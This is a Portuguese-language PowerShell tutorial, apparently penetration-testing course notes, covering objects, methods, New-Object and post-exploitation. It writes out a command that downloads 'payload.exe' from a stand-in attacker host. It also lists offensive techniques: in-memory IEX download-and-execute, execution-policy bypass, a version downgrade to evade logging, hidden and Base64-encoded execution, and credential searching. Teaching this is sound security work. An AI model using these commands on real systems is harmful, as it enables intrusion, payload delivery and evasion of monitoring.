## Objetos e Métodos

### Entendendo objetos no PowerShell

Diferente de outros shells que retornam texto puro, o PowerShell retorna **objetos**
derivados de classes .NET. Cada objeto possui:

- **Propriedades:** dados associados ao objeto (ex: `Name`, `Id`, `Path`)
- **Métodos:** ações que podem ser executadas no objeto (ex: `Kill`, `Start`)

### Visualizando propriedades

```powershell
# Ver todas as propriedades de processos
Get-Process | Format-List *
```

### Descobrindo métodos disponíveis

```powershell
# Listar métodos dos objetos retornados por Get-Process
Get-Process | Get-Member -MemberType Method
```

### Exemplo: encerrar um processo usando método

```powershell
# Encerrar todos os processos do Firefox
Get-Process -Name "firefox" | Kill
```

**Fluxo lógico:**

1. Identificar o objeto de interesse (`Get-Process`)
2. Descobrir os métodos disponíveis (`Get-Member`)
3. Aplicar o método desejado via pipeline (`Kill`)

---

## Módulo 11 — Criando Objetos .NET

### O cmdlet New-Object

Com `New-Object`, podemos instanciar classes do .NET Framework ou objetos COM
diretamente no PowerShell, expandindo enormemente nossas capacidades.

### Exemplo: download de arquivo via WebClient

```powershell
# Criar uma instância do WebClient
$webclient = New-Object System.Net.WebClient

# Definir a URL de origem e o destino local
$url = "https://servidor_atacante/payload.exe"
$destino = "C:\ProgramData\payload.exe"

# Realizar o download
$webclient.DownloadFile($url, $destino)
```

**Explicação linha a linha:**

1. `New-Object System.Net.WebClient` — cria um cliente HTTP usando a classe .NET
2. `$url` — armazena o endereço do arquivo remoto
3. `$destino` — define onde o arquivo será salvo localmente
4. `.DownloadFile()` — método do WebClient que efetua o download

> Este é um dos métodos mais clássicos de transferência de arquivos em cenários
> de pós-exploração.

---

## Módulo 12 — Exploração e Pós-Exploração com PowerShell

### Conceitos gerais

O PowerShell é extremamente valioso nas fases de exploração e pós-exploração
de um pentest pelos seguintes motivos:

- **Execução em memória:** scripts podem ser baixados e executados sem tocar o disco.
- **Reconhecimento do sistema:** cmdlets como `Get-Process`, `Get-Service`,
  `Get-WmiObject` fornecem informações detalhadas sobre o alvo.
- **Escalação de privilégios:** é possível identificar serviços vulneráveis, permissões
  mal configuradas e caminhos de DLL hijacking.
- **Movimentação lateral:** frameworks como PowerSploit oferecem cmdlets prontos
  para essa finalidade.
- **Evasão de antivírus:** técnicas de ofuscação e execução em memória dificultam
  a detecção.

### Técnicas comuns (resumo)

| Técnica | Descrição |
|---------|-----------|
| Download e execução em memória | Usar `IEX (New-Object Net.WebClient).DownloadString(url)` |
| Bypass de Execution Policy | `-ExecutionPolicy Bypass` ao invocar o PowerShell |
| Downgrade de versão | `-Version 2` para evitar logging avançado |
| Janela oculta | `-WindowStyle Hidden` para execução discreta |
| Comando codificado | `-EncodedCommand` para ofuscar o comando em Base64 |
| Enumeração de serviços | `Get-WmiObject -class win32_service` para buscar alvos de escalação |
| Busca de credenciais | `Select-String` para procurar senhas em arquivos |

---

## Referências e Leitura Complementar

- PowerShell no GitHub: https://github.com/powershell/powershell
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- Documentação oficial de Cmdlets: https://docs.microsoft.com/en-us/powershell/
- Living off the Land: https://www.secureworks.com/blog/living-off-the-land
- .NET Framework: https://en.wikipedia.org/wiki/.NET_Framework
- WMI: https://en.wikipedia.org/wiki/Windows_Management_Instrumentation
- COM: https://en.wikipedia.org/wiki/Component_Object_Model

---
